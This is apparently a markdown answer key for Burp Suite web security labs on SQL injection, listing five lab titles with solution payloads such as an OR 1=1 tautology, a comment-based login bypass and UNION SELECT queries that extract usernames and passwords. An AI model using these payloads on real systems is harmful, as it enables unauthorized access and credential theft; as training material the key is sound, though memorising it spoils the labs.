# Burpsuite Lab Answers
## SQL injection 
### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Solution: '+OR+1=1--
![](Images/SQL-1.png)

### SQL injection vulnerability allowing login bypass
#### Solution: administrator'--
![](Images/SQL-2.png)

### SQL injection UNION attack, determining the number of columns returned by the query
#### Solution: 'UNION SELECT NULL, NULL, NULL--
![](Images/SQL-3.png)

### SQL injection UNION attack, finding a column containing text
#### Solution: 'UNION SELECT NULL,'HELLO BUDDY',NULL--
![](Images/SQL-4.png)

### SQL injection UNION attack, retrieving data from other tables
#### Solution: 'UNION SELECT username, password FROM users--
![](Images/SQL-5a.png)
![](Images/SQL-5b.png)
